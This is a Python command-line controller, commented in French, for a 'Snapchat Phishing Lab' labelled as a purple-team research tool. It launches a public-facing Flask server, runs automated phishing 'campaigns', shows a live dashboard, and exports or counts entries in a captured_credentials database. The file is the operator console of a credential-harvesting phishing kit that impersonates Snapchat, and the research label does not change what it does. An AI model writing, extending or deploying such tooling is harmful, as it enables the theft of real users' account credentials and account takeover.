"""
snapchat-lab CLI — Point d'entree unifie
Usage: snapchat-lab [command] [options]
"""

import click
import sys
import os

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, BASE_DIR)


@click.group()
@click.version_option(version="1.0.0", prog_name="snapchat-lab")
def cli():
    """Snapchat Phishing Lab — Purple Team Research Tool"""
    pass


@cli.command()
@click.option("--port", default=8080, help="Port du serveur")
@click.option("--host", default="0.0.0.0", help="Hote")
@click.option("--no-https", is_flag=True, help="Desactiver HTTPS")
def start(port, host, no_https):
    """Demarrer le serveur Flask"""
    from main import create_app, CONFIG

    if no_https:
        CONFIG["USE_HTTPS"] = False
    if port:
        CONFIG["SERVER_PORT"] = port

    app = create_app()
    proto = "https" if CONFIG["USE_HTTPS"] else "http"
    addr = "{}://{}:{}".format(proto, host, CONFIG["SERVER_PORT"])
    print("\n  Serveur lance sur " + addr)
    app.run(
        host=host,
        port=CONFIG["SERVER_PORT"],
        ssl_context="adhoc" if CONFIG["USE_HTTPS"] else None,
        threaded=True,
    )


@cli.command()
def dashboard():
    """Dashboard terminal live avec Rich"""
    from dashboard_terminal import run_dashboard

    run_dashboard()


@cli.command()
def campaign():
    """Menu campagne automatisee"""
    from campaign_manager import interactive_menu

    interactive_menu()


@cli.command()
@click.option("--key", "-k", prompt="Admin key", help="Cle admin", hide_input=True)
@click.option(
    "--format", "-f", "fmt",
    type=click.Choice(["json", "csv", "txt", "report"]),
    default="json",
    help="Format d'export",
)
@click.option("--output", "-o", help="Fichier de sortie (defaut: stdout)")
def export(key, fmt, output):
    """Exporter les captures"""
    import requests
    from main import CONFIG

    proto = "https" if CONFIG.get("USE_HTTPS", False) else "http"
    port = CONFIG.get("SERVER_PORT", 8080)
    urls = {
        "json": "/export?key={}".format(key),
        "csv": "/export/csv?key={}".format(key),
        "txt": "/export/txt?key={}".format(key),
        "report": "/export/report?key={}".format(key),
    }

    try:
        url = "{}://127.0.0.1:{}{}".format(proto, port, urls[fmt])
        r = requests.get(url, verify=False)
        if r.status_code != 200:
            click.echo("Erreur {}: {}".format(r.status_code, r.text), err=True)
            sys.exit(1)
        content = r.text

        if output:
            with open(output, "w", encoding="utf-8") as f:
                f.write(content)
            click.echo("Exporte vers " + output)
        else:
            click.echo(content)
    except requests.exceptions.ConnectionError:
        msg = "Erreur: serveur non accessible sur 127.0.0.1:{}".format(port)
        click.echo(msg, err=True)
        click.echo("Lance d'abord: snapchat-lab start", err=True)
        sys.exit(1)


@cli.command()
@click.option("--key", "-k", prompt="Admin key", help="Cle admin", hide_input=True)
@click.confirmation_option(prompt="Vider la base de donnees ?")
def reset(key):
    """Vider la base de donnees (avec confirmation)"""
    import requests
    from main import CONFIG

    proto = "https" if CONFIG.get("USE_HTTPS", False) else "http"
    port = CONFIG.get("SERVER_PORT", 8080)
    try:
        url = "{}://127.0.0.1:{}/reset?key={}".format(proto, port, key)
        r = requests.post(url, data={"confirm": "true"}, verify=False)
        if r.status_code == 200:
            click.echo("Base reinitialisee.")
        else:
            click.echo("Erreur: {}".format(r.text), err=True)
    except requests.exceptions.ConnectionError:
        click.echo("Erreur: serveur non accessible", err=True)
        sys.exit(1)


@cli.command()
def db():
    """Afficher les infos de la base de donnees"""
    import sqlite3
    from main import CONFIG

    db_path = CONFIG["CAPTURE_DB"]
    if not os.path.exists(db_path):
        click.echo("Base de donnees introuvable.")
        return

    conn = sqlite3.connect(db_path)
    c = conn.cursor()
    total = c.execute("SELECT COUNT(*) FROM captured_credentials").fetchone()[0]
    today = c.execute(
        "SELECT COUNT(*) FROM captured_credentials WHERE DATE(timestamp) = DATE('now')"
    ).fetchone()[0]
    logs = c.execute("SELECT COUNT(*) FROM experiment_log").fetchone()[0]
    conn.close()

    info = "Base: {}\nCaptures: {}  |  Aujourd'hui: {}\nLogs: {}".format(
        db_path, total, today, logs)
    click.echo(info)


if __name__ == "__main__":
    cli()
